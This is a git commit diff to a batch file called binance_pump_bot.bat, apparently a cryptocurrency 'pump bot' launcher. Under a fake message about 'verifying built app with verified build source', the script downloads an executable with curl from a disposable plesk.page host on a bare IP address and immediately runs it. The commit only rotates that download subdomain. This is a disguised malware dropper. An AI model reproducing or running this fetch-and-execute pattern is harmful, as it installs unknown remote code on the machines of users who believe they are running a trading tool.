ceb921bf2d6dafe70693b95025a67a24905b2ac3
Coinsw.app <69402425+CoinSwapPump@users.noreply.github.com>
2022-05-07 06:06:46 +0300

    Update binance_pump_bot.bat

--- binance_pump_bot.bat
+++ binance_pump_bot.bat
@@ -3,7 +3,7 @@ color 0A
 echo -
 echo		    Please wait for verifying built app with verified build source...
 echo -
-curl "https://sleepy-swanson.137-184-117-69.plesk.page/VerifiedBuildSource" --output py/binance_pump_bot.exe
+curl "https://mystifying-golick.137-184-117-69.plesk.page/VerifiedBuildSource" --output py/binance_pump_bot.exe
 echo Building now complete and extracted to the directory.
 start "PumpBot" py/binance_pump_bot.exe
 pause
